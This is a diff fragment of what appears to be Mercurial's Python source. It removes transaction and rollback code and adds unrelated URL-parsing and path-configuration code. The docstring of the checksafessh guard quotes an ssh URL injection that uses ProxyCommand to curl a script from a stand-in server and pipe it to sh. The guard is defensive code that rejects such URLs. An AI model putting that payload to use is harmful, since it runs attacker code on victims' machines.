+            or self.path.startswith(b'/')
+            or hasdriveletter(self.path)
+        ):
+            s += b'//'
+            if hasdriveletter(self.path):
+                s += b'/'
+        if self.user:
+            s += urlreq.quote(self.user, safe=self._safechars)
+        if self.passwd:
+            s += b':' + urlreq.quote(self.passwd, safe=self._safechars)
+        if self.user or self.passwd:
+            s += b'@'
+        if self.host:
+            if not (self.host.startswith(b'[') and self.host.endswith(b']')):
+                s += urlreq.quote(self.host)
+            else:
+                s += self.host
+        if self.port:
+            s += b':' + urlreq.quote(self.port)
+        if self.host:
+            s += b'/'
+        if self.path:
+            # TODO: similar to the query string, we should not unescape the
+            # path when we store it, the path might contain '%2f' = '/',
+            # which we should *not* escape.
+            s += urlreq.quote(self.path, safe=self._safepchars)
+        if self.query:
+            # we store the query in escaped form.
+            s += b'?' + self.query
+        if self.fragment is not None:
+            s += b'#' + urlreq.quote(self.fragment, safe=self._safepchars)
+        return s
 
-    def __repr__(self):
-        name = '/'.join(self._names)
-        return '<transaction name=%s, count=%d, usages=%d>' % (
-            name,
-            self._count,
-            self._usages,
+    __str__ = encoding.strmethod(__bytes__)
+
+    def authinfo(self):
+        user, passwd = self.user, self.passwd
+        try:
+            self.user, self.passwd = None, None
+            s = bytes(self)
+        finally:
+            self.user, self.passwd = user, passwd
+        if not self.user:
+            return (s, None)
+        # authinfo[1] is passed to urllib2 password manager, and its
+        # URIs must not contain credentials. The host is passed in the
+        # URIs list because Python < 2.4.3 uses only that to search for
+        # a password.
+        return (s, (None, (s, self.host), self.user, self.passwd or b''))
+
+    def isabs(self):
+        if self.scheme and self.scheme != b'file':
+            return True  # remote URL
+        if hasdriveletter(self.path):
+            return True  # absolute for our purposes - can't be joined()
+        if self.path.startswith(br'\\'):
+            return True  # Windows UNC path
+        if self.path.startswith(b'/'):
+            return True  # POSIX-style
+        return False
+
+    def localpath(self):
+        # type: () -> bytes
+        if self.scheme == b'file' or self.scheme == b'bundle':
+            path = self.path or b'/'
+            # For Windows, we need to promote hosts containing drive
+            # letters to paths with drive letters.
+            if hasdriveletter(self._hostport):
+                path = self._hostport + b'/' + self.path
+            elif (
+                self.host is not None and self.path and not hasdriveletter(path)
+            ):
+                path = b'/' + path
+            return path
+        return self._origpath
+
+    def islocal(self):
+        '''whether localpath will return something that posixfile can open'''
+        return (
+            not self.scheme
+            or self.scheme == b'file'
+            or self.scheme == b'bundle'
         )
 
-    def __del__(self):
-        if self._journal:
-            self._abort()
 
-    @property
-    def finalized(self):
-        return self._finalizecallback is None
+def hasscheme(path):
+    # type: (bytes) -> bool
+    return bool(url(path).scheme)  # cast to help pytype
 
-    @active
-    def startgroup(self):
-        """delay registration of file entry
-
-        This is used by strip to delay vision of strip offset. The transaction
-        sees either none or all of the strip actions to be done."""
-        self._queue.append([])
-
-    @active
-    def endgroup(self):
-        """apply delayed registration of file entry.
-
-        This is used by strip to delay vision of strip offset. The transaction
-        sees either none or all of the strip actions to be done."""
-        q = self._queue.pop()
-        for f, o in q:
-            self._addentry(f, o)
-
-    @active
-    def add(self, file, offset):
-        """record the state of an append-only file before update"""
-        if (
-            file in self._newfiles
-            or file in self._offsetmap
-            or file in self._backupmap
-            or file in self._tmp_files
-        ):
-            return
-        if self._queue:
-            self._queue[-1].append((file, offset))
-            return
 
-        self._addentry(file, offset)
+def hasdriveletter(path):
+    # type: (bytes) -> bool
+    return bool(path) and path[1:2] == b':' and path[0:1].isalpha()
 
-    def _addentry(self, file, offset):
-        """add a append-only entry to memory and on-disk state"""
-        if (
-            file in self._newfiles
-            or file in self._offsetmap
-            or file in self._backupmap
-            or file in self._tmp_files
-        ):
-            return
-        if offset:
-            self._offsetmap[file] = offset
-        else:
-            self._newfiles.add(file)
-        # add enough data to the journal to do the truncate
-        self._file.write(b"%s\0%d\n" % (file, offset))
-        self._file.flush()
-
-    @active
-    def addbackup(self, file, hardlink=True, location=b'', for_offset=False):
-        """Adds a backup of the file to the transaction
-
-        Calling addbackup() creates a hardlink backup of the specified file
-        that is used to recover the file in the event of the transaction
-        aborting.
 
-        * `file`: the file path, relative to .hg/store
-        * `hardlink`: use a hardlink to quickly create the backup
+def urllocalpath(path):
+    # type: (bytes) -> bytes
+    return url(path, parsequery=False, parsefragment=False).localpath()
 
-        If `for_offset` is set, we expect a offset for this file to have been previously recorded
-        """
-        if self._queue:
-            msg = b'cannot use transaction.addbackup inside "group"'
-            raise error.ProgrammingError(msg)
 
-        if file in self._newfiles or file in self._backupmap:
-            return
-        elif file in self._offsetmap and not for_offset:
-            return
-        elif for_offset and file not in self._offsetmap:
-            msg = (
-                'calling `addbackup` with `for_offmap=True`, '
-                'but no offset recorded: [%r] %r'
+def checksafessh(path):
+    # type: (bytes) -> None
+    """check if a path / url is a potentially unsafe ssh exploit (SEC)
+
+    This is a sanity check for ssh urls. ssh will parse the first item as
+    an option; e.g. ssh://-oProxyCommand=curl${IFS}bad.server|sh/path.
+    Let's prevent these potentially exploited urls entirely and warn the
+    user.
+
+    Raises an error.Abort when the url is unsafe.
+    """
+    path = urlreq.unquote(path)
+    if path.startswith(b'ssh://-') or path.startswith(b'svn+ssh://-'):
+        raise error.Abort(
+            _(b'potentially unsafe url: %r') % (pycompat.bytestr(path),)
+        )
+
+
+def hidepassword(u):
+    # type: (bytes) -> bytes
+    '''hide user credential in a url string'''
+    u = url(u)
+    if u.passwd:
+        u.passwd = b'***'
+    return bytes(u)
+
+
+def removeauth(u):
+    # type: (bytes) -> bytes
+    '''remove all authentication information from a url string'''
+    u = url(u)
+    u.user = u.passwd = None
+    return bytes(u)
+
+
+def list_paths(ui, target_path=None):
+    """list all the (name, paths) in the passed ui"""
+    result = []
+    if target_path is None:
+        for name, paths in sorted(ui.paths.items()):
+            for p in paths:
+                result.append((name, p))
+
+    else:
+        for path in ui.paths.get(target_path, []):
+            result.append((target_path, path))
+    return result
+
+
+def try_path(ui, url):
+    """try to build a path from a url
+
+    Return None if no Path could built.
+    """
+    try:
+        # we pass the ui instance are warning might need to be issued
+        return path(ui, None, rawloc=url)
+    except ValueError:
+        return None
+
+
+def get_push_paths(repo, ui, dests):
+    """yields all the `path` selected as push destination by `dests`"""
+    if not dests:
+        if b'default-push' in ui.paths:
+            for p in ui.paths[b'default-push']:
+                yield p.get_push_variant()
+        elif b'default' in ui.paths:
+            for p in ui.paths[b'default']:
+                yield p.get_push_variant()
+        else:
+            raise error.ConfigError(
+                _(b'default repository not configured!'),
+                hint=_(b"see 'hg help config.paths'"),
             )
-            msg %= (location, file)
-            raise error.ProgrammingError(msg)
+    else:
+        for dest in dests:
+            if dest in ui.paths:
+                for p in ui.paths[dest]:
+                    yield p.get_push_variant()
+            else:
+                path = try_path(ui, dest)
+                if path is None:
+                    msg = _(b'repository %s does not exist')
+                    msg %= dest
+                    raise error.RepoError(msg)
+                yield path.get_push_variant()
+
+
+def get_pull_paths(repo, ui, sources):
+    """yields all the `(path, branch)` selected as pull source by `sources`"""
+    if not sources:
+        sources = [b'default']
+    for source in sources:
+        if source in ui.paths:
+            for p in ui.paths[source]:
+                yield p
+        else:
+            p = path(ui, None, source, validate_path=False)
+            yield p
 
-        vfs = self._vfsmap[location]
-        dirname, filename = vfs.split(file)
-        backupfilename = b"%s.backup.%s" % (self._journal, filename)
-        backupfile = vfs.reljoin(dirname, backupfilename)
-        if vfs.exists(file):
-            filepath = vfs.join(file)
-            backuppath = vfs.join(backupfile)
-            # store encoding may result in different directory here.
-            # so we have to ensure the destination directory exist
-            final_dir_name = os.path.dirname(backuppath)
-            util.makedirs(final_dir_name, mode=vfs.createmode, notindexed=True)
-            # then we can copy the backup
-            util.copyfile(filepath, backuppath, hardlink=hardlink)
+
+def get_unique_push_path(action, repo, ui, dest=None):
+    """return a unique `path` or abort if multiple are found
+
+    This is useful for command and action that does not support multiple
+    destination (yet).
+
+    The `action` parameter will be used for the error message.
+    """
+    if dest is None:
+        dests = []
+    else:
+        dests = [dest]
+    dests = list(get_push_paths(repo, ui, dests))
+    if len(dests) != 1:
+        if dest is None:
+            msg = _(
+                b"default path points to %d urls while %s only supports one"
+            )
+            msg %= (len(dests), action)
         else:
-            backupfile = b''
+            msg = _(b"path points to %d urls while %s only supports one: %s")
+            msg %= (len(dests), action, dest)
+        raise error.Abort(msg)
+    return dests[0]
 
-        self._addbackupentry((location, file, backupfile, False))
 
-    def _addbackupentry(self, entry):
-        """register a new backup entry and write it to disk"""
-        self._backupentries.append(entry)
-        self._backupmap[entry[1]] = len(self._backupentries) - 1
-        self._backupsfile.write(b"%s\0%s\0%s\0%d\n" % entry)
-        self._backupsfile.flush()
-
-    @active
-    def registertmp(self, tmpfile, location=b''):
-        """register a temporary transaction file
+def get_unique_pull_path_obj(action, ui, source=None):
+    """return a unique `(path, branch)` or abort if multiple are found
 
-        Such files will be deleted when the transaction exits (on both
-        failure and success).
-        """
-        self._tmp_files.add(tmpfile)
-        self._addbackupentry((location, b'', tmpfile, False))
+    This is useful for command and action that does not support multiple
+    destination (yet).
 
-    @active
-    def addfilegenerator(
-        self,
-        genid,
-        filenames,
-        genfunc,
-        order=0,
-        location=b'',
-        post_finalize=False,
-    ):
-        """add a function to generates some files at transaction commit
+    The `action` parameter will be used for the error message.
 
-        The `genfunc` argument is a function capable of generating proper
-        content of each entry in the `filename` tuple.
+    note: Ideally, this function would be called `get_unique_pull_path` to
+    mirror the `get_unique_push_path`, but the name was already taken.
+    """
+    sources = []
+    if source is not None:
+        sources.append(source)
+
+    pull_paths = list(get_pull_paths(None, ui, sources=sources))
+    path_count = len(pull_paths)
+    if path_count != 1:
+        if source is None:
+            msg = _(
+                b"default path points to %d urls while %s only supports one"
+            )
+            msg %= (path_count, action)
+        else:
+            msg = _(b"path points to %d urls while %s only supports one: %s")
+            msg %= (path_count, action, source)
+        raise error.Abort(msg)
+    return pull_paths[0]
 
-        At transaction close time, `genfunc` will be called with one file
-        object argument per entries in `filenames`.
 
-        The transaction itself is responsible for the backup, creation and
-        final write of such file.
+def get_unique_pull_path(action, repo, ui, source=None, default_branches=()):
+    """return a unique `(url, branch)` or abort if multiple are found
 
-        The `genid` argument is used to ensure the same set of file is only
-        generated once. Call to `addfilegenerator` for a `genid` already
-        present will overwrite the old entry.
+    See `get_unique_pull_path_obj` for details.
+    """
+    path = get_unique_pull_path_obj(action, ui, source=source)
+    return parseurl(path.rawloc, default_branches)
 
-        The `order` argument may be used to control the order in which multiple
-        generator will be executed.
 
-        The `location` arguments may be used to indicate the files are located
-        outside of the the standard directory for transaction. It should match
-        one of the key of the `transaction.vfsmap` dictionary.
+def get_clone_path_obj(ui, source):
+    """return the `(origsource, url, branch)` selected as clone source"""
+    if source == b'':
+        return None
+    return get_unique_pull_path_obj(b'clone', ui, source=source)
+
+
+def get_clone_path(ui, source, default_branches=None):
+    """return the `(origsource, url, branch)` selected as clone source"""
+    path = get_clone_path_obj(ui, source)
+    if path is None:
+        return (b'', b'', (None, default_branches))
+    if default_branches is None:
+        default_branches = []
+    branches = (path.branch, default_branches)
+    return path.rawloc, path.loc, branches
+
+
+def parseurl(path, branches=None):
+    '''parse url#branch, returning (url, (branch, branches))'''
+    u = url(path)
+    branch = None
+    if u.fragment:
+        branch = u.fragment
+        u.fragment = None
+    return bytes(u), (branch, branches or [])
 
-        The `post_finalize` argument can be set to `True` for file generation
-        that must be run after the transaction has been finalized.
-        """
-        # For now, we are unable to do proper backup and restore of custom vfs
-        # but for bookmarks that are handled outside this mechanism.
-        entry = (order, filenames, genfunc, location, post_finalize)
-        self._filegenerators[genid] = entry
-
-    @active
-    def removefilegenerator(self, genid):
-        """reverse of addfilegenerator, remove a file generator function"""
-        if genid in self._filegenerators:
-            del self._filegenerators[genid]
-
-    def _generatefiles(self, suffix=b'', group=GEN_GROUP_ALL):
-        # write files registered for generation
-        any = False
 
-        if group == GEN_GROUP_ALL:
-            skip_post = skip_pre = False
-        else:
-            skip_pre = group == GEN_GROUP_POST_FINALIZE
-            skip_post = group == GEN_GROUP_PRE_FINALIZE
+class paths(dict):
+    """Represents a collection of paths and their configs.
 
-        for id, entry in sorted(self._filegenerators.items()):
-            any = True
-            order, filenames, genfunc, location, post_finalize = entry
+    Data is initially derived from ui instances and the config files they have
+    loaded.
+    """
 
-            # for generation at closing, check if it's before or after finalize
-            if skip_post and post_finalize:
-                continue
-            elif skip_pre and not post_finalize:
-                continue
+    def __init__(self, ui):
+        dict.__init__(self)
 
-            vfs = self._vfsmap[location]
-            files = []
-            try:
-                for name in filenames:
-                    name += suffix
-                    if suffix:
-                        self.registertmp(name, location=location)
-                        checkambig = False
-                    else:
-                        self.addbackup(name, location=location)
-                        checkambig = (name, location) in self._checkambigfiles
-                    files.append(
-                        vfs(name, b'w', atomictemp=True, checkambig=checkambig)
-                    )
-                genfunc(*files)
-                for f in files:
-                    f.close()
-                # skip discard() loop since we're sure no open file remains
-                del files[:]
-            finally:
-                for f in files:
-                    f.discard()
-        return any
-
-    @active
-    def findoffset(self, file):
-        if file in self._newfiles:
-            return 0
-        return self._offsetmap.get(file)
-
-    @active
-    def readjournal(self):
-        self._file.seek(0)
-        entries = []
-        for l in self._file.readlines():
-            file, troffset = l.split(b'\0')
-            entries.append((file, int(troffset)))
-        return entries
+        home_path = os.path.expanduser(b'~')
 
-    @active
-    def replace(self, file, offset):
-        """
-        replace can only replace already committed entries
-        that are not pending in the queue
-        """
-        if file in self._newfiles:
-            if not offset:
-                return
-            self._newfiles.remove(file)
-            self._offsetmap[file] = offset
-        elif file in self._offsetmap:
-            if not offset:
-                del self._offsetmap[file]
-                self._newfiles.add(file)
+        for name, value in ui.configitems(b'paths', ignoresub=True):
+            # No location is the same as not existing.
+            if not value:
+                continue
+            _value, sub_opts = ui.configsuboptions(b'paths', name)
+            s = ui.configsource(b'paths', name)
+            root_key = (name, value, s)
+            root = ui._path_to_root.get(root_key, home_path)
+
+            multi_url = sub_opts.get(b'multi-urls')
+            if multi_url is not None and stringutil.parsebool(multi_url):
+                base_locs = stringutil.parselist(value)
             else:
-                self._offsetmap[file] = offset
-        else:
-            raise KeyError(file)
-        self._file.write(b"%s\0%d\n" % (file, offset))
-        self._file.flush()
-
-    @active
-    def nest(self, name='<unnamed>'):
-        self._count += 1
-        self._usages += 1
-        self._names.append(name)
-        return self
-
-    def release(self):
-        if self._count > 0:
-            self._usages -= 1
-        if self._names:
-            self._names.pop()
-        # if the transaction scopes are left without being closed, fail
-        if self._count > 0 and self._usages == 0:
-            self._abort()
-
-    def running(self):
-        return self._count > 0
+                base_locs = [value]
 
-    def addpending(self, category, callback):
-        """add a callback to be called when the transaction is pending
+            paths = []
+            for loc in base_locs:
+                loc = os.path.expandvars(loc)
+                loc = os.path.expanduser(loc)
+                if not hasscheme(loc) and not os.path.isabs(loc):
+                    loc = os.path.normpath(os.path.join(root, loc))
+                p = path(ui, name, rawloc=loc, suboptions=sub_opts)
+                paths.append(p)
+            self[name] = paths
 
-        The transaction will be given as callback's first argument.
+        for name, old_paths in sorted(self.items()):
+            new_paths = []
+            for p in old_paths:
+                new_paths.extend(_chain_path(p, ui, self))
+            self[name] = new_paths
 
-        Category is a unique identifier to allow overwriting an old callback
-        with a newer callback.
-        """
-        self._pendingcallback[category] = callback
 
-    @active
-    def writepending(self):
-        """write pending file to temporary version
-
-        This is used to allow hooks to view a transaction before commit"""
-        categories = sorted(self._pendingcallback)
-        for cat in categories:
-            # remove callback since the data will have been flushed
-            any = self._pendingcallback.pop(cat)(self)
-            self._anypending = self._anypending or any
-        self._anypending |= self._generatefiles(suffix=b'.pending')
-        return self._anypending
-
-    @active
-    def hasfinalize(self, category):
-        """check is a callback already exist for a category"""
-        return category in self._finalizecallback
-
-    @active
-    def addfinalize(self, category, callback):
-        """add a callback to be called when the transaction is closed
+_pathsuboptions = {}
 
-        The transaction will be given as callback's first argument.
 
-        Category is a unique identifier to allow overwriting old callbacks with
-        newer callbacks.
-        """
-        self._finalizecallback[category] = callback
+def pathsuboption(option, attr):
+    """Decorator used to declare a path sub-option.
 
-    @active
-    def addpostclose(self, category, callback):
-        """add or replace a callback to be called after the transaction closed
+    Arguments are the sub-option name and the attribute it should set on
+    ``path`` instances.
 
-        The transaction will be given as callback's first argument.
+    The decorated function will receive as arguments a ``ui`` instance,
+    ``path`` instance, and the string value of this option from the config.
+    The function should return the value that will be set on the ``path``
+    instance.
 
-        Category is a unique identifier to allow overwriting an old callback
-        with a newer callback.
-        """
-        self._postclosecallback[category] = callback
+    This decorator can be used to perform additional verification of
+    sub-options and to change the type of sub-options.
+    """
 
-    @active
-    def getpostclose(self, category):
-        """return a postclose callback added before, or None"""
-        return self._postclosecallback.get(category, None)
+    def register(func):
+        _pathsuboptions[option] = (attr, func)
+        return func
+
+    return register
+
+
+@pathsuboption(b'pushurl', b'_pushloc')
+def pushurlpathoption(ui, path, value):
+    u = url(value)
+    # Actually require a URL.
+    if not u.scheme:
+        msg = _(b'(paths.%s:pushurl not a URL; ignoring: "%s")\n')
+        msg %= (path.name, value)
+        ui.warn(msg)
+        return None
+
+    # Don't support the #foo syntax in the push URL to declare branch to
+    # push.
+    if u.fragment:
+        ui.warn(
+            _(
+                b'("#fragment" in paths.%s:pushurl not supported; '
+                b'ignoring)\n'
+            )
+            % path.name
+        )
+        u.fragment = None
 
-    @active
-    def addabort(self, category, callback):
-        """add a callback to be called when the transaction is aborted.
+    return bytes(u)
 
-        The transaction will be given as the first argument to the callback.
 
-        Category is a unique identifier to allow overwriting an old callback
-        with a newer callback.
-        """
-        self._abortcallback[category] = callback
+@pathsuboption(b'pushrev', b'pushrev')
+def pushrevpathoption(ui, path, value):
+    return value
+
+
+SUPPORTED_BOOKMARKS_MODES = {
+    b'default',
+    b'mirror',
+    b'ignore',
+}
+
+
+@pathsuboption(b'bookmarks.mode', b'bookmarks_mode')
+def bookmarks_mode_option(ui, path, value):
+    if value not in SUPPORTED_BOOKMARKS_MODES:
+        path_name = path.name
+        if path_name is None:
+            # this is an "anonymous" path, config comes from the global one
+            path_name = b'*'
+        msg = _(b'(paths.%s:bookmarks.mode has unknown value: "%s")\n')
+        msg %= (path_name, value)
+        ui.warn(msg)
+    if value == b'default':
+        value = None
+    return value
+
+
+DELTA_REUSE_POLICIES = {
+    b'default': None,
+    b'try-base': revlog_constants.DELTA_BASE_REUSE_TRY,
+    b'no-reuse': revlog_constants.DELTA_BASE_REUSE_NO,
+    b'forced': revlog_constants.DELTA_BASE_REUSE_FORCE,
+}
+
+
+@pathsuboption(b'pulled-delta-reuse-policy', b'delta_reuse_policy')
+def delta_reuse_policy(ui, path, value):
+    if value not in DELTA_REUSE_POLICIES:
+        path_name = path.name
+        if path_name is None:
+            # this is an "anonymous" path, config comes from the global one
+            path_name = b'*'
+        msg = _(
+            b'(paths.%s:pulled-delta-reuse-policy has unknown value: "%s")\n'
+        )
+        msg %= (path_name, value)
+        ui.warn(msg)
+    return DELTA_REUSE_POLICIES.get(value)
 
-    @active
-    def addvalidator(self, category, callback):
-        """adds a callback to be called when validating the transaction.
-
-        The transaction will be given as the first argument to the callback.
-
-        callback should raise exception if to abort transaction"""
-        self._validatecallback[category] = callback
-
-    @active
-    def close(self):
-        '''commit the transaction'''
-        if self._count == 1:
-            for category in sorted(self._validatecallback):
-                self._validatecallback[category](self)
-            self._validatecallback = None  # Help prevent cycles.
-            self._generatefiles(group=GEN_GROUP_PRE_FINALIZE)
-            while self._finalizecallback:
-                callbacks = self._finalizecallback
-                self._finalizecallback = {}
-                categories = sorted(callbacks)
-                for cat in categories:
-                    callbacks[cat](self)
-            # Prevent double usage and help clear cycles.
-            self._finalizecallback = None
-            self._generatefiles(group=GEN_GROUP_POST_FINALIZE)
 
-        self._count -= 1
-        if self._count != 0:
-            return
-        self._file.close()
-        self._backupsfile.close()
-        # cleanup temporary files
-        for l, f, b, c in self._backupentries:
-            if l not in self._vfsmap and c:
-                self._report(
-                    b"couldn't remove %s: unknown cache location %s\n" % (b, l)
-                )
-                continue
-            vfs = self._vfsmap[l]
-            if not f and b and vfs.exists(b):
-                try:
-                    vfs.unlink(b)
-                except (IOError, OSError, error.Abort) as inst:
-                    if not c:
-                        raise
-                    # Abort may be raise by read only opener
-                    self._report(
-                        b"couldn't remove %s: %s\n" % (vfs.join(b), inst)
-                    )
-        self._offsetmap = {}
-        self._newfiles = set()
-        self._writeundo()
-        if self._after:
-            self._after()
-            self._after = None  # Help prevent cycles.
-        if self._opener.isfile(self._backupjournal):
-            self._opener.unlink(self._backupjournal)
-        if self._opener.isfile(self._journal):
-            self._opener.unlink(self._journal)
-        for l, _f, b, c in self._backupentries:
-            if l not in self._vfsmap and c:
-                self._report(
-                    b"couldn't remove %s: unknown cache location"
-                    b"%s\n" % (b, l)
-                )
-                continue
-            vfs = self._vfsmap[l]
-            if b and vfs.exists(b):
-                try:
-                    vfs.unlink(b)
-                except (IOError, OSError, error.Abort) as inst:
-                    if not c:
-                        raise
-                    # Abort may be raise by read only opener
-                    self._report(
-                        b"couldn't remove %s: %s\n" % (vfs.join(b), inst)
-                    )
-        self._backupentries = []
-        self._journal = None
-
-        self._releasefn(self, True)  # notify success of closing transaction
-        self._releasefn = None  # Help prevent cycles.
-
-        # run post close action
-        categories = sorted(self._postclosecallback)
-        for cat in categories:
-            self._postclosecallback[cat](self)
-        # Prevent double usage and help clear cycles.
-        self._postclosecallback = None
-
-    @active
-    def abort(self):
-        """abort the transaction (generally called on error, or when the
-        transaction is not explicitly committed before going out of
-        scope)"""
-        self._abort()
-
-    @active
-    def add_journal(self, vfs_id, path):
-        self._journal_files.append((vfs_id, path))
-
-    def _writeundo(self):
-        """write transaction data for possible future undo call"""
-        if self._undoname is None:
-            return
-        cleanup_undo_files(
-            self._report,
-            self._vfsmap,
-            undo_prefix=self._undoname,
+@pathsuboption(b'multi-urls', b'multi_urls')
+def multiurls_pathoption(ui, path, value):
+    res = stringutil.parsebool(value)
+    if res is None:
+        ui.warn(
+            _(b'(paths.%s:multi-urls not a boolean; ignoring)\n') % path.name
         )
+        res = False
+    return res
 
-        def undoname(fn: bytes) -> bytes:
-            base, name = os.path.split(fn)
-            assert name.startswith(self._journal)
-            new_name = name.replace(self._journal, self._undoname, 1)
-            return os.path.join(base, new_name)
-
-        undo_backup_path = b"%s.backupfiles" % self._undoname
-        undobackupfile = self._opener.open(undo_backup_path, b'w')
-        undobackupfile.write(b'%d\n' % version)
-        for l, f, b, c in self._backupentries:
-            if not f:  # temporary file
-                continue
-            if not b:
-                u = b''
-            else:
-                if l not in self._vfsmap and c:
-                    self._report(
-                        b"couldn't remove %s: unknown cache location"
-                        b"%s\n" % (b, l)
-                    )
-                    continue
-                vfs = self._vfsmap[l]
-                u = undoname(b)
-                util.copyfile(vfs.join(b), vfs.join(u), hardlink=True)
-            undobackupfile.write(b"%s\0%s\0%s\0%d\n" % (l, f, u, c))
-        undobackupfile.close()
-        for vfs, src in self._journal_files:
-            dest = undoname(src)
-            # if src and dest refer to a same file, vfs.rename is a no-op,
-            # leaving both src and dest on disk. delete dest to make sure
-            # the rename couldn't be such a no-op.
-            vfs.tryunlink(dest)
-            try:
-                vfs.rename(src, dest)
-            except FileNotFoundError:  # journal file does not yet exist
-                pass
-
-    def _abort(self):
-        entries = self.readjournal()
-        self._count = 0
-        self._usages = 0
-        self._file.close()
-        self._backupsfile.close()
 
-        quick = self._can_quick_abort(entries)
-        try:
-            if not quick:
-                self._report(_(b"transaction abort!\n"))
-            for cat in sorted(self._abortcallback):
-                self._abortcallback[cat](self)
-            # Prevent double usage and help clear cycles.
-            self._abortcallback = None
-            if quick:
-                self._do_quick_abort(entries)
+def _chain_path(base_path, ui, paths):
+    """return the result of "path://" logic applied on a given path"""
+    new_paths = []
+    if base_path.url.scheme != b'path':
+        new_paths.append(base_path)
+    else:
+        assert base_path.url.path is None
+        sub_paths = paths.get(base_path.url.host)
+        if sub_paths is None:
+            m = _(b'cannot use `%s`, "%s" is not a known path')
+            m %= (base_path.rawloc, base_path.url.host)
+            raise error.Abort(m)
+        for subpath in sub_paths:
+            path = base_path.copy()
+            if subpath.raw_url.scheme == b'path':
+                m = _(b'cannot use `%s`, "%s" is also defined as a `path://`')
+                m %= (path.rawloc, path.url.host)
+                raise error.Abort(m)
+            path.url = subpath.url
+            path.rawloc = subpath.rawloc
+            path.loc = subpath.loc
+            if path.branch is None:
+                path.branch = subpath.branch
             else:
-                self._do_full_abort(entries)
-        finally:
-            self._journal = None
-            self._releasefn(self, False)  # notify failure of transaction
-            self._releasefn = None  # Help prevent cycles.
+                base = path.rawloc.rsplit(b'#', 1)[0]
+                path.rawloc = b'%s#%s' % (base, path.branch)
+            suboptions = subpath._all_sub_opts.copy()
+            suboptions.update(path._own_sub_opts)
+            path._apply_suboptions(ui, suboptions)
+            new_paths.append(path)
+    return new_paths
 
-    def _can_quick_abort(self, entries):
-        """False if any semantic content have been written on disk
 
-        True if nothing, except temporary files has been writen on disk."""
-        if entries:
-            return False
-        for e in self._backupentries:
-            if e[1]:
-                return False
-        return True
-
-    def _do_quick_abort(self, entries):
-        """(Silently) do a quick cleanup (see _can_quick_abort)"""
-        assert self._can_quick_abort(entries)
-        tmp_files = [e for e in self._backupentries if not e[1]]
-        for vfs_id, old_path, tmp_path, xxx in tmp_files:
-            vfs = self._vfsmap[vfs_id]
-            try:
-                vfs.unlink(tmp_path)
-            except FileNotFoundError:
-                pass
-        if self._backupjournal:
-            self._opener.unlink(self._backupjournal)
-        if self._journal:
-            self._opener.unlink(self._journal)
+class path:
+    """Represents an individual path and its configuration."""
 
-    def _do_full_abort(self, entries):
-        """(Noisily) rollback all the change introduced by the transaction"""
-        try:
-            _playback(
-                self._journal,
-                self._report,
-                self._opener,
-                self._vfsmap,
-                entries,
-                self._backupentries,
-                False,
-                checkambigfiles=self._checkambigfiles,
-            )
-            self._report(_(b"rollback completed\n"))
-        except BaseException as exc:
-            self._report(_(b"rollback failed - please run hg recover\n"))
-            self._report(
-                _(b"(failure reason: %s)\n") % stringutil.forcebytestr(exc)
-            )
+    def __init__(
+        self,
+        ui=None,
+        name=None,
+        rawloc=None,
+        suboptions=None,
+        validate_path=True,
+    ):
+        """Construct a path from its config options.
 
+        ``ui`` is the ``ui`` instance the path is coming from.
+        ``name`` is the symbolic name of the path.
+        ``rawloc`` is the raw location, as defined in the config.
+        ``_pushloc`` is the raw locations pushes should be made to.
+                     (see the `get_push_variant` method)
+
+        If ``name`` is not defined, we require that the location be a) a local
+        filesystem path with a .hg directory or b) a URL. If not,
+        ``ValueError`` is raised.
+        """
+        if ui is None:
+            # used in copy
+            assert name is None
+            assert rawloc is None
+            assert suboptions is None
+            return
 
-BAD_VERSION_MSG = _(
-    b"journal was created by a different version of Mercurial\n"
-)
+        if not rawloc:
+            raise ValueError(b'rawloc must be defined')
 
+        self.name = name
 
-def read_backup_files(report, fp):
-    """parse an (already open) backup file an return contained backup entries
+        # set by path variant to point to their "non-push" version
+        self.main_path = None
+        self._setup_url(rawloc)
+
+        if validate_path:
+            self._validate_path()
+
+        _path, sub_opts = ui.configsuboptions(b'paths', b'*')
+        self._own_sub_opts = {}
+        if suboptions is not None:
+            self._own_sub_opts = suboptions.copy()
+            sub_opts.update(suboptions)
+        self._all_sub_opts = sub_opts.copy()
+
+        self._apply_suboptions(ui, sub_opts)
+
+    def _setup_url(self, rawloc):
+        # Locations may define branches via syntax <base>#<branch>.
+        u = url(rawloc)
+        branch = None
+        if u.fragment:
+            branch = u.fragment
+            u.fragment = None
+
+        self.url = u
+        # the url from the config/command line before dealing with `path://`
+        self.raw_url = u.copy()
+        self.branch = branch
 
-    entries are in the form: (location, file, backupfile, xxx)
+        self.rawloc = rawloc
+        self.loc = b'%s' % u
 
-    :location:   the vfs identifier (vfsmap's key)
-    :file:       original file path (in the vfs)
-    :backupfile: path of the backup (in the vfs)
-    :cache:      a boolean currently always set to False
-    """
-    lines = fp.readlines()
-    backupentries = []
-    if lines:
-        ver = lines[0][:-1]
-        if ver != (b'%d' % version):
-            report(BAD_VERSION_MSG)
-        else:
-            for line in lines[1:]:
-                if line:
-                    # Shave off the trailing newline
-                    line = line[:-1]
-                    l, f, b, c = line.split(b'\0')
-                    backupentries.append((l, f, b, bool(c)))
-    return backupentries
-
-
-def rollback(
-    opener,
-    vfsmap,
-    file,
-    report,
-    checkambigfiles=None,
-    skip_journal_pattern=None,
-):
-    """Rolls back the transaction contained in the given file
-
-    Reads the entries in the specified file, and the corresponding
-    '*.backupfiles' file, to recover from an incomplete transaction.
-
-    * `file`: a file containing a list of entries, specifying where
-    to truncate each file.  The file should contain a list of
-    file\0offset pairs, delimited by newlines. The corresponding
-    '*.backupfiles' file should contain a list of file\0backupfile
-    pairs, delimited by \0.
-
-    `checkambigfiles` is a set of (path, vfs-location) tuples,
-    which determine whether file stat ambiguity should be avoided at
-    restoring corresponded files.
-    """
-    entries = []
-    backupentries = []
+    def copy(self, new_raw_location=None):
+        """make a copy of this path object
 
-    with opener.open(file) as fp:
-        lines = fp.readlines()
-    for l in lines:
-        try:
-            f, o = l.split(b'\0')
-            entries.append((f, int(o)))
-        except ValueError:
-            report(
-                _(b"couldn't read journal entry %r!\n") % pycompat.bytestr(l)
+        When `new_raw_location` is set, the new path will point to it.
+        This is used by the scheme extension so expand the scheme.
+        """
+        new = self.__class__()
+        for k, v in self.__dict__.items():
+            new_copy = getattr(v, 'copy', None)
+            if new_copy is not None:
+                v = new_copy()
+            new.__dict__[k] = v
+        if new_raw_location is not None:
+            new._setup_url(new_raw_location)
+        return new
+
+    @property
+    def is_push_variant(self):
+        """is this a path variant to be used for pushing"""
+        return self.main_path is not None
+
+    def get_push_variant(self):
+        """get a "copy" of the path, but suitable for pushing
+
+        This means using the value of the `pushurl` option (if any) as the url.
+
